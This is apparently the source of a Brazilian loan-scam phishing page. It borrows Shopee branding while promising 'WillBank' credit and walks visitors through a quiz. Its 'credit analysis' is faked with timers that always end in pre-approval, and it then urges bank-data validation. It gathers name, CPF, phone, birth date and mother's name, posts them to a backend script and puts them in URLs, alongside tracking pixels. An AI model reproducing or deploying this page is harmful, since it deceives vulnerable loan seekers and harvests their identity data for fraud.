<!DOCTYPE html>
<html lang="pt-BR">
<head>
 <!-- üî• UTMIFY TRACKING - vers√£o otimizada -->
<script>
  // ID do seu pixel UTMify
  window.pixelId = "690d7df482986500f1b44d88";

  // persist√™ncia manual de UTM antes do pixel carregar
  (function() {
    try {
      const params = new URLSearchParams(window.location.search);
      if([...params.keys()].some(k => k.includes('utm_'))){
        localStorage.setItem('utmify_backup', window.location.search);
      }
    } catch(e){}
  })();

  // carrega pixel da UTMify
  (function(){
    var a = document.createElement("script");
    a.async = true; a.defer = true;
    a.src = "https://cdn.utmify.com.br/scripts/pixel/pixel.js";
    document.head.appendChild(a);
  })();
</script>

<!-- Script principal de UTMs -->
<script
  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
  data-utmify-prevent-xcod-sck
  data-utmify-prevent-subids
  data-utmify-force-persist
  async
  defer
></script>
  <!-- META / CLARITY -->
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script type="text/javascript">
    (function (c, l, a, r, i, t, y) {
      c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments); };
      t = l.createElement(r); t.async = 1;
      t.src = "https://www.clarity.ms/tag/" + i;
      y = l.getElementsByTagName(r)[0];
      y.parentNode.insertBefore(t, y);
    })(window, document, "clarity", "script", "sgok0woyb3");
  </script>

  <!-- TAILWIND -->
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            shopee: {
              light: "#cab600",
              DEFAULT: "#f5d317",
              dark: "#ffd900",
            },
          },
        },
      },
    };
  </script>
  <!-- FONTES -->
  <link rel="stylesheet" href="css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">

  <!-- ESTILOS -->
  <style>
    body { font-family: "Poppins", sans-serif; background-color: #f6f6f6; }
    .shopee-gradient { background: linear-gradient(135deg, #ffd900 0%, #cab600 100%); }
    .card { box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05); border-radius: 16px; transition: all 0.3s ease; }
    .btn-shine { position: relative; overflow: hidden; }
    .btn-shine:after { content: ""; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,0.3) 50%, rgba(255,255,255,0) 100%); transform: rotate(30deg); animation: shine 4s infinite; }
    @keyframes shine { 0%{left:-100%;opacity:0;} 10%{left:100%;opacity:0.6;} 100%{left:100%;opacity:0;} }
    .floating { animation: float 3s ease-in-out infinite; }
    @keyframes float { 0%{transform:translateY(0);} 50%{transform:translateY(-10px);} 100%{transform:translateY(0);} }
    .progress-container{width:100%;height:8px;background-color:#e5e7eb;border-radius:4px;margin-bottom:20px;}
    .progress-bar{height:100%;border-radius:4px;background:linear-gradient(90deg,#ffd900 0%,#cab600 100%);transition:width .5s ease;}
    .quiz-option{border:2px solid #e5e7eb;transition:all .3s ease;}
    .quiz-option:hover{border-color:#ffd900;background-color:rgba(255,241,238,0.336);}
    .quiz-option.selected{border-color:#ffd900;background-color:#ffd90033;}
    .icon-circle{width:44px;height:44px;display:flex;align-items:center;justify-content:center;border-radius:50%;}
    .page-transition{transition:opacity .4s ease,transform .4s ease;}
    .fade-out{opacity:0;transform:translateY(20px);}
    .fade-in{opacity:1;transform:translateY(0);}
  </style>
</head>

<body class="bg-gray-50">
  <div id="quizPage" class="max-w-md mx-auto min-h-screen flex flex-col relative bg-white page-transition">
    <!-- HEADER -->
    <div class="flex items-center p-4 border-b">
      <button id="btnVoltar" class="text-shopee text-2xl mr-3">
        <i class="fas fa-arrow-left"></i>
      </button>
      <div class="flex items-center">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQtF4d5voZs-uursQomBUaKsPkTw8evy5PwsA&s" alt="Shopee Logo" class="h-8">
        <span class="ml-2 text-xl font-bold text-shopee"></span>
      </div>
    </div>

    <!-- CONTE√öDO DO QUIZ -->
    <div class="flex-1 p-6 flex flex-col">
      <!-- PROGRESSO -->
      <div class="mb-6">
        <div class="flex justify-between mb-2">
          <span class="text-sm text-gray-600">Pr√©-an√°lise de cr√©dito</span>
          <span id="progressText" class="text-sm font-semibold text-shopee">1/8</span>
        </div>
        <div class="progress-container">
          <div id="progressBar" class="progress-bar" style="width: 20%"></div>
        </div>
      </div>

      <!-- PERGUNTA 1 -->
      <div id="question1" class="quiz-question">
        <h2 class="text-xl font-bold text-gray-800 mb-4">Qual o valor aproximado que voc√™ deseja solicitar?</h2>
        <p class="text-gray-600 mb-6">Escolha a faixa de valor mais adequada √† sua necessidade.</p>
        <div class="space-y-3 mb-6">
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="500-1000" data-question="1">
            <div class="flex items-center">
              <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
                <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
              </div>
              <p class="font-medium text-gray-800">R$500 ‚Äì R$1.000</p>
            </div>
          </div>
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="1001-3000" data-question="1">
            <div class="flex items-center">
              <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
                <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
              </div>
              <p class="font-medium text-gray-800">R$1.001 ‚Äì R$3.000</p>
            </div>
          </div>
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="3001-5000" data-question="1">
            <div class="flex items-center">
              <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
                <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
              </div>
              <p class="font-medium text-gray-800">R$3.001 ‚Äì R$5.000</p>
            </div>
          </div>
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="acima5000" data-question="1">
            <div class="flex items-center">
              <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
                <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
              </div>
              <p class="font-medium text-gray-800">Acima de R$5.000</p>
            </div>
          </div>
        </div>
      </div>

      <!-- PERGUNTA 2 -->
      <div id="question2" class="quiz-question hidden">
        <h2 class="text-xl font-bold text-gray-800 mb-4">Possui renda fixa atualmente?</h2>
        <p class="text-gray-600 mb-6">Esta informa√ß√£o nos ajuda a calcular o valor de cr√©dito ideal para voc√™.</p>
        <div class="space-y-3 mb-6">
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="carteira-assinada" data-question="2"><p class="font-medium text-gray-800">Sim, carteira assinada</p></div>
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="autonomo" data-question="2"><p class="font-medium text-gray-800">Sim, aut√¥nomo</p></div>
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="sem-renda" data-question="2"><p class="font-medium text-gray-800">N√£o tenho renda fixa</p></div>
        </div>
      </div>

      <!-- PERGUNTA 3 -->
      <div id="question3" class="quiz-question hidden">
        <h2 class="text-xl font-bold text-gray-800 mb-4">Seu nome est√° negativado atualmente?</h2>
        <p class="text-gray-600 mb-6">Esta informa√ß√£o nos ajuda a avaliar seu perfil de cr√©dito.</p>
        <div class="space-y-3 mb-6">
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="sim" data-question="3"><p class="font-medium text-gray-800">Sim</p></div>
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="nao" data-question="3"><p class="font-medium text-gray-800">N√£o</p></div>
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="nao-sei" data-question="3"><p class="font-medium text-gray-800">N√£o sei</p></div>
        </div>
      </div>

      <!-- PERGUNTA 4 -->
      <div id="question4" class="quiz-question hidden">
        <h2 class="text-xl font-bold text-gray-800 mb-4">J√° tentou solicitar algum tipo de cr√©dito online nos √∫ltimos 6 meses?</h2>
        <p class="text-gray-600 mb-6">Esta informa√ß√£o √© necess√°ria para avaliarmos o seu perfil de cr√©dito.</p>
        <div class="space-y-3 mb-6">
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="aprovado" data-question="4"><p class="font-medium text-gray-800">Sim, fui aprovado</p></div>
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="negado" data-question="4"><p class="font-medium text-gray-800">Sim, fui negado</p></div>
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="nao" data-question="4"><p class="font-medium text-gray-800">N√£o</p></div>
        </div>
      </div>
      <!-- PERGUNTA 5 -->
      <div id="question5" class="quiz-question hidden">
        <h2 class="text-xl font-bold text-gray-800 mb-4">Qual o melhor dia pra vencimento do seu empr√©stimo?</h2>
        <p class="text-gray-600 mb-6">Escolha a data que melhor se adequa ao seu planejamento financeiro mensal.</p>
        <div class="space-y-3 mb-6">
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="10" data-question="5"><p class="font-medium text-gray-800">Dia 10</p></div>
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="15" data-question="5"><p class="font-medium text-gray-800">Dia 15</p></div>
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="20" data-question="5"><p class="font-medium text-gray-800">Dia 20</p></div>
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="25" data-question="5"><p class="font-medium text-gray-800">Dia 25</p></div>
        </div>
      </div>

      <!-- PERGUNTA 6 -->
      <div id="question6" class="quiz-question hidden">
        <h2 class="text-xl font-bold text-gray-800 mb-4">Pra qual finalidade voc√™ precisa desse cr√©dito?</h2>
        <p class="text-gray-600 mb-6">Esta informa√ß√£o nos ajuda a personalizar sua oferta de acordo com suas necessidades.</p>
        <div class="space-y-3 mb-6">
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="pagar-contas" data-question="6"><p class="font-medium text-gray-800">Pagar contas</p></div>
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="investir-negocio" data-question="6"><p class="font-medium text-gray-800">Investir no pr√≥prio neg√≥cio</p></div>
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="comprar-algo" data-question="6"><p class="font-medium text-gray-800">Comprar algo importante</p></div>
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="uso-pessoal" data-question="6"><p class="font-medium text-gray-800">Uso pessoal</p></div>
        </div>
      </div>

      <!-- PERGUNTA 7 -->
      <div id="question7" class="quiz-question hidden">
        <h2 class="text-xl font-bold text-gray-800 mb-4">Voc√™ j√° possui cart√£o de cr√©dito ativo?</h2>
        <p class="text-gray-600 mb-6">Esta informa√ß√£o nos ajuda a personalizar a melhor oferta para seu perfil.</p>
        <div class="space-y-3 mb-6">
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="sim" data-question="7"><p class="font-medium text-gray-800">Sim</p></div>
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="nao" data-question="7"><p class="font-medium text-gray-800">N√£o</p></div>
        </div>
      </div>

      <!-- PERGUNTA 8 (telefone) -->
      <div id="question8" class="quiz-question hidden">
        <h2 class="text-xl font-bold text-gray-800 mb-4">Por medidas de seguran√ßa, informe seu telefone</h2>
        <p class="text-gray-600 mb-6">Utilizaremos para confirmar seus dados e enviar o c√≥digo de acesso.</p>
        <div class="mb-6">
          <label for="telefoneInput" class="block text-gray-700 font-medium mb-2">N√∫mero de Telefone:</label>
          <input type="tel" id="telefoneInput" placeholder="(00) 00000-0000" class="w-full border border-gray-300 rounded-xl p-4 focus:outline-none focus:ring-2 focus:ring-shopee focus:border-transparent">
          <p class="text-sm text-gray-500 mt-1">Digite seu n√∫mero com DDD</p>
        </div>
        <button id="btnConfirmarTelefone" class="w-full bg-shopee hover:bg-shopee-dark text-white font-bold py-4 rounded-xl mb-4">Confirmar telefone</button>
      </div>

      <!-- TELA DE AN√ÅLISE -->
      <div id="analysisScreen" class="quiz-question hidden">
        <div class="text-center py-6 md:py-12">
          <div class="relative w-32 h-32 mx-auto mb-8">
            <div class="absolute inset-0 rounded-full border-4 border-gray-200"></div>
            <div class="absolute inset-0 rounded-full border-4 border-transparent border-t-shopee animate-spin"></div>
            <div class="absolute inset-0 flex items-center justify-center">
              <i class="fas fa-shield-alt text-shopee text-3xl"></i>
            </div>
          </div>

          <h2 class="text-2xl font-bold text-gray-800 mb-6">Analisando seu perfil</h2>

          <div class="max-w-xs mx-auto bg-white rounded-xl shadow-sm p-4 mb-6">
            <div class="flex justify-between items-center mb-4">
              <span class="text-sm font-medium text-gray-700">Verificando score</span>
              <span class="text-sm text-gray-400" id="statusScore"><i class="fas fa-circle-notch fa-spin text-shopee"></i></span>
            </div>
            <div class="flex justify-between items-center mb-4">
              <span class="text-sm font-medium text-gray-700">Consultando limite</span>
              <span class="text-sm text-gray-400" id="statusLimite"><i class="fas fa-circle-notch fa-spin text-shopee"></i></span>
            </div>
            <div class="flex justify-between items-center mb-4" id="analiseBeneficios">
              <span class="text-sm font-medium text-gray-700">Analisando benef√≠cios</span>
              <span class="text-sm text-gray-400" id="statusBeneficios"><i class="fas fa-circle-notch fa-spin text-shopee"></i></span>
            </div>
            <div class="flex justify-between items-center mb-4" id="analiseRendimentos">
              <span class="text-sm font-medium text-gray-700">Calculando rendimentos</span>
              <span class="text-sm text-gray-400" id="statusRendimentos"><i class="fas fa-circle-notch fa-spin text-shopee"></i></span>
            </div>
            <div class="flex justify-between items-center" id="analiseAprovacao">
              <span class="text-sm font-medium text-gray-700">Processando aprova√ß√£o</span>
              <span class="text-sm text-gray-400" id="statusAprovacao"><i class="fas fa-circle-notch fa-spin text-shopee"></i></span>
            </div>
          </div>

          <div class="w-full max-w-xs mx-auto bg-gray-100 h-2 rounded-full overflow-hidden">
            <div id="loadingProgressBar" class="h-full bg-shopee w-0 transition-all duration-500 ease-out"></div>
          </div>

          <p class="text-gray-500 mt-4 text-sm">Isso pode levar alguns segundos...</p>
        </div>
      </div>

      <!-- RESULTADO -->
      <div id="quizResult" class="quiz-question hidden">
        <div class="text-center py-6">
          <div class="bg-green-100 p-4 rounded-full inline-flex items-center justify-center mb-4">
            <i class="fas fa-check-circle text-green-500 text-4xl"></i>
          </div>
          <h2 class="text-2xl font-bold text-gray-800 mb-2">Seu CPF foi pr√©-aprovado</h2>
          <div class="bg-shopee-light bg-opacity-10 p-4 rounded-xl my-4">
            <div class="flex items-center">
              <div class="text-shopee mr-3"><i class="fas fa-lock text-xl"></i></div>
              <p class="text-left text-gray-700">Libera√ß√£o imediata mediante valida√ß√£o de dados banc√°rios.</p>
            </div>
          </div>
          <p class="text-gray-600 mb-6">Parab√©ns! Voc√™ est√° a um passo de receber o seu cr√©dito WillBank. Complete a valida√ß√£o para liberar seu limite.</p>
        </div>
      </div>

      <!-- BOT√ïES DE NAVEGA√á√ÉO -->
      <div class="mt-auto">
        <button id="btnNext" class="w-full bg-shopee hover:bg-shopee-dark text-white text-lg font-bold py-4 rounded-xl btn-shine hidden">Continuar</button>
        <button id="btnSolicitar" class="w-full bg-shopee hover:bg-shopee-dark text-white text-lg font-bold py-4 rounded-xl btn-shine hidden">Solicitar libera√ß√£o</button>
      </div>
    </div>
  </div>

  <!-- SCRIPTS: L√ìGICA DO QUIZ E ENVIO -->
  <script>
    document.addEventListener("DOMContentLoaded", function () {
      // Recupera dados j√° salvos
      const dadosUsuarioJSON = localStorage.getItem("dadosUsuario");
      if (!dadosUsuarioJSON) {
        console.warn("Dados do usu√°rio n√£o encontrados no localStorage ‚Äî certifique-se que a p√°gina anterior salvou 'dadosUsuario'.");
      }

      // Elementos
      const progressBar = document.getElementById("progressBar");
      const progressText = document.getElementById("progressText");
      const btnNext = document.getElementById("btnNext");
      const btnSolicitar = document.getElementById("btnSolicitar");
      const btnVoltar = document.getElementById("btnVoltar");
      const btnConfirmarTelefone = document.getElementById("btnConfirmarTelefone");

      // Estado do quiz
      let currentQuestion = 1;
      const totalQuestions = 8;
      const userAnswers = {};
      let telefone = "";
      let analysisStarted = false;

      function updateProgress() {
        const progress = (currentQuestion / totalQuestions) * 100;
        progressBar.style.width = `${progress}%`;
        progressText.textContent = `${currentQuestion}/${totalQuestions}`;
      }

      function startAnalysis() {
        if (analysisStarted) return;
        analysisStarted = true;
        const loadingBar = document.getElementById("loadingProgressBar");
        loadingBar.style.width = "0%";

        // Sequ√™ncia de etapas (timings mantidos conforme original)
        setTimeout(() => {
          document.getElementById("statusScore").innerHTML = '<i class="fas fa-check-circle text-green-500"></i>';
          loadingBar.style.width = "20%";
          setTimeout(() => {
            document.getElementById("statusLimite").innerHTML = '<i class="fas fa-check-circle text-green-500"></i>';
            loadingBar.style.width = "40%";
            setTimeout(() => {
              document.getElementById("statusBeneficios").innerHTML = '<i class="fas fa-check-circle text-green-500"></i>';
              loadingBar.style.width = "60%";
              setTimeout(() => {
                document.getElementById("statusRendimentos").innerHTML = '<i class="fas fa-check-circle text-green-500"></i>';
                loadingBar.style.width = "80%";
                setTimeout(() => {
                  document.getElementById("statusAprovacao").innerHTML = '<i class="fas fa-check-circle text-green-500"></i>';
                  loadingBar.style.width = "100%";
                  setTimeout(() => {
                    document.getElementById("analysisScreen").classList.add("hidden");
                    document.getElementById("quizResult").classList.remove("hidden");
                    progressText.textContent = "Conclu√≠do";
                    btnSolicitar.classList.remove("hidden");
                  }, 700);
                }, 1200);
              }, 1200);
            }, 1200);
          }, 1200);
        }, 1000);
      }

      function goToNextQuestion() {
        const currentQuestionEl = document.getElementById(`question${currentQuestion}`);
        if (currentQuestionEl) currentQuestionEl.classList.add("hidden");

        if (currentQuestion < totalQuestions) {
          currentQuestion++;
          const nextEl = document.getElementById(`question${currentQuestion}`);
          if (nextEl) nextEl.classList.remove("hidden");
          updateProgress();
        } else {
          // final -> an√°lise
          document.getElementById("analysisScreen").classList.remove("hidden");
          progressBar.style.width = "100%";
          progressText.textContent = "Analisando";
          setTimeout(startAnalysis, 300);
        }
      }

      // Sele√ß√£o de op√ß√µes
      document.querySelectorAll(".quiz-option").forEach((option) => {
        option.addEventListener("click", function () {
          const questionNumber = this.getAttribute("data-question");
          const questionEl = document.getElementById(`question${questionNumber}`);

          if (questionEl) {
            questionEl.querySelectorAll(".quiz-option").forEach((opt) => {
              opt.classList.remove("selected");
              const sel = opt.querySelector(".option-selected");
              if (sel) sel.classList.add("hidden");
            });
          }

          this.classList.add("selected");
          const selThis = this.querySelector(".option-selected");
          if (selThis) selThis.classList.remove("hidden");

          const answerValue = this.getAttribute("data-value");
          userAnswers[questionNumber] = answerValue;

          setTimeout(() => {
            goToNextQuestion();
          }, 300);
        });
      });

      // M√°scara simples para telefone
      const telefoneInput = document.getElementById("telefoneInput");
      if (telefoneInput) {
        telefoneInput.addEventListener("input", function (e) {
          let value = e.target.value.replace(/\D/g, "");
          if (value.length > 11) value = value.substring(0, 11);
          if (value.length > 2 && value.length <= 6) {
            value = `(${value.substring(0, 2)}) ${value.substring(2)}`;
          } else if (value.length > 6) {
            value = `(${value.substring(0, 2)}) ${value.substring(2, 7)}-${value.substring(7)}`;
          }
          e.target.value = value;
        });
      }

      // Confirmar telefone
      if (btnConfirmarTelefone) {
        btnConfirmarTelefone.addEventListener("click", function () {
          const telefoneEl = document.getElementById("telefoneInput");
          if (!telefoneEl || !telefoneEl.value) {
            alert("Por favor, informe seu telefone para continuar.");
            return;
          }
          telefone = telefoneEl.value;
          goToNextQuestion();
        });
      }

      // Bot√£o voltar
      if (btnVoltar) {
        btnVoltar.addEventListener("click", function () {
          window.history.back();
        });
      }

      // Bot√£o solicitar (envio final)
      if (btnSolicitar) {
        btnSolicitar.addEventListener("click", function () {
          console.clear();

          const telefoneFormatado = (telefone || "").replace(/\D/g, "");
          if (!telefoneFormatado || telefoneFormatado.length < 10) {
            alert("Por favor, informe um telefone v√°lido.");
            return;
          }

          const dadosUsuarioJSON2 = localStorage.getItem("dadosUsuario");
          if (!dadosUsuarioJSON2) {
            console.error("Dados do usu√°rio n√£o encontrados no localStorage");
            alert("Dados do usu√°rio n√£o encontrados. Por favor, reinicie o processo.");
            window.location.href = "./index.html";
            return;
          }

          try {
            const dadosUsuario = JSON.parse(dadosUsuarioJSON2);
            if (!dadosUsuario.cpf || !dadosUsuario.nome) {
              console.error("Dados de CPF ou nome n√£o encontrados:", dadosUsuario);
              alert("Dados incompletos. Por favor, reinicie o processo.");
              window.location.href = "./index.html";
              return;
            }

            const cpfLimpo = dadosUsuario.cpf.replace(/\D/g, "");

            const mapearValorEmprestimo = {
              "500-1000": "R$500 - R$1.000",
              "1001-3000": "R$1.001 - R$3.000",
              "3001-5000": "R$3.001 - R$5.000",
              acima5000: "Acima de R$5.000",
            };

            const mapearRendaFixa = {
              "carteira-assinada": "Sim, carteira assinada",
              autonomo: "Sim, aut√¥nomo",
              "sem-renda": "N√£o tenho renda fixa",
            };

            const mapearSolicitouCredito = {
              aprovado: "Sim, foi aprovado",
              negado: "Sim, foi negado",
              nao: "N√£o",
            };

            const mapearFinalidadeCredito = {
              "pagar-contas": "Pagar contas",
              "investir-negocio": "Investir no pr√≥prio neg√≥cio",
              "comprar-algo": "Comprar algo importante",
              "uso-pessoal": "Uso pessoal",
            };

            const dadosParaSalvar = {
              nome: dadosUsuario.nome,
              cpf: cpfLimpo,
              telefone: telefoneFormatado,
              valor_emprestimo: mapearValorEmprestimo[userAnswers["1"]] || "",
              renda_fixa: mapearRendaFixa[userAnswers["2"]] || "",
              negativado: userAnswers["3"] === "sim" ? "Sim" : userAnswers["3"] === "nao" ? "N√£o" : "N√£o sei",
              solicitou_credito: mapearSolicitouCredito[userAnswers["4"]] || "",
              dia_vencimento: userAnswers["5"] ? "Dia " + userAnswers["5"] : "",
              finalidade_credito: mapearFinalidadeCredito[userAnswers["6"]] || "",
              cartao_credito: userAnswers["7"] === "sim" ? "Sim" : "N√£o",
            };

            console.log("Dados para salvar:", dadosParaSalvar);

            // Envia para backend ‚Äî mant√©m comportamento original (continua redirecionando)
            fetch("./salvar_dados.php", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(dadosParaSalvar),
            })
            .then((response) => response.json().catch(()=>({})))
            .then((data) => {
              console.log("Resposta do servidor:", data);
              // monta nova URL com par√¢metros existentes + cpf/nome/numero
              const urlAtual = new URLSearchParams(window.location.search);
              const novaUrl = new URLSearchParams();
              for (const [chave, valor] of urlAtual.entries()) novaUrl.append(chave, valor);
              novaUrl.set("cpf", cpfLimpo);
              novaUrl.set("nome", dadosUsuario.nome);
              novaUrl.set("numero", telefoneFormatado);
              window.location.href = `./simulacao?${novaUrl.toString()}`;
            })
            .catch((error) => {
              console.error("Erro na requisi√ß√£o:", error);
              const urlAtual = new URLSearchParams(window.location.search);
              const novaUrl = new URLSearchParams();
              for (const [chave, valor] of urlAtual.entries()) novaUrl.append(chave, valor);
              novaUrl.set("cpf", cpfLimpo);
              novaUrl.set("nome", dadosUsuario.nome);
              novaUrl.set("numero", telefoneFormatado);
              window.location.href = `./simulacao?${novaUrl.toString()}`;
            });

          } catch (error) {
            console.error("Erro ao processar dados:", error);
            alert("Erro ao processar dados. Por favor, reinicie o processo.");
            window.location.href = "./index.html";
          }
        });
      }

      // inicia progresso
      updateProgress();
    });
  </script>

  <!-- SCRIPTS: SINCRONIZA√á√ÉO/EXTRA√á√ÉO DE PAR√ÇMETROS (merge com localStorage) -->
  <script>
    document.addEventListener("DOMContentLoaded", () => {
      const params = new URLSearchParams(window.location.search);

      // Pega o que j√° existe no localStorage (salvo pela p√°gina anterior)
      let dadosUsuario = JSON.parse(localStorage.getItem("dadosUsuario") || "{}");

      // Se existir nome/cpf/telefone na URL, atualiza ‚Äî sen√£o mant√©m os que j√° est√£o salvos
      const nomeUrl = decodeURIComponent(params.get("nome") || "");
      const cpfUrl = decodeURIComponent(params.get("cpf") || "");
      const telefoneUrl = decodeURIComponent(params.get("telefone") || params.get("numero") || "");

      if (nomeUrl) dadosUsuario.nome = nomeUrl;
      if (cpfUrl) dadosUsuario.cpf = cpfUrl;
      if (telefoneUrl) dadosUsuario.telefone = telefoneUrl;

      // Outros campos opcionais
      dadosUsuario.data_nascimento = decodeURIComponent(params.get("data_nascimento") || dadosUsuario.data_nascimento || "");
      dadosUsuario.sexo = decodeURIComponent(params.get("sexo") || dadosUsuario.sexo || "");
      dadosUsuario.nome_mae = decodeURIComponent(params.get("nome_mae") || dadosUsuario.nome_mae || "");

      // Extrair e salvar UTMs automaticamente
      const utmKeys = ["utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term"];
      utmKeys.forEach(key => {
        if (params.has(key)) {
          const value = params.get(key);
          dadosUsuario[key] = value;
          localStorage.setItem(key, value);
        }
      });

      // Salvar o JSON final (merge entre o que veio e o que j√° tinha)
      localStorage.setItem("dadosUsuario", JSON.stringify(dadosUsuario));
      console.log("‚úÖ Dados + UTMs sincronizados no localStorage:", dadosUsuario);
    });
  </script>
<!-- ============================
     SCRIPT FINAL DE SINCRONIZA√á√ÉO AVAN√áADA
=============================== -->
<script>
document.addEventListener("DOMContentLoaded", () => {
  try {
    // üîπ Carregar dados existentes
    let dados = JSON.parse(localStorage.getItem("dadosUsuario") || "{}");
    const params = new URLSearchParams(window.location.search);

    // üîπ Atualizar a partir da URL (caso exista algo novo)
    ["nome", "cpf", "telefone", "numero", "data_nascimento", "sexo", "nome_mae"].forEach(chave => {
      const valor = decodeURIComponent(params.get(chave) || "");
      if (valor && valor.trim() !== "") {
        if (chave === "numero" && !dados.telefone) dados.telefone = valor;
        else dados[chave] = valor;
      }
    });

    // üîπ Corrigir redund√¢ncia (telefone vs numero)
    if (dados.numero && !dados.telefone) dados.telefone = dados.numero;
    if (dados.telefone && !dados.numero) dados.numero = dados.telefone;

    // üîπ Corrigir nome e cpf se vierem mascarados (valida√ß√£o leve)
    if (dados.cpf) dados.cpf = dados.cpf.replace(/[^\d]/g, "").substring(0, 11);

    // üîπ UTM Merge final
    const utmKeys = ["utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term"];
    utmKeys.forEach(k => {
      const v = params.get(k) || localStorage.getItem(k);
      if (v) {
        dados[k] = v;
        localStorage.setItem(k, v);
      }
    });

    // üîπ Persistir de volta
    localStorage.setItem("dadosUsuario", JSON.stringify(dados));
    console.log("‚úÖ Sincroniza√ß√£o final ‚Äî dadosUsuario atualizado:", dados);

    // üîπ Aplicar dados na interface (caso tenha placeholders)
    if (document.querySelector("#nomeUsuario")) document.querySelector("#nomeUsuario").innerText = dados.nome || "";
    if (document.querySelector("#telefoneUsuario")) document.querySelector("#telefoneUsuario").innerText = dados.telefone || "";
    if (document.querySelector("#cpfUsuario")) document.querySelector("#cpfUsuario").innerText = dados.cpf || "";

    // üîπ Verifica√ß√£o de fallback: se n√£o existir dados v√°lidos, opcionalmente redireciona
    if (!dados.nome || !dados.cpf) {
      console.warn("‚ö†Ô∏è Dados incompletos detectados. Se necess√°rio, redirecione para in√≠cio.");
      // window.location.href = "./index.html"; // descomente se quiser for√ßar rein√≠cio
    }
  } catch (e) {
    console.error("‚ùå Erro na sincroniza√ß√£o final:", e);
  }
});
</script>
 <script>
  !function(f,b,e,v,n,t,s)
  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
  n.queue=[];t=b.createElement(e);t.async=!0;
  t.src=v;s=b.getElementsByTagName(e)[0];
  s.parentNode.insertBefore(t,s)}(window, document,'script',
  'https://connect.facebook.net/en_US/fbevents.js');
    fbq('init', '1266369171942952');
    fbq('track', 'ViewContent');
</script>

<noscript>
    <img height='1' width='1' style='display:none' 
         src='https://www.facebook.com/tr?id=1266369171942952&ev=ViewContent&noscript=1'/>
</noscript>
</body>
</html>
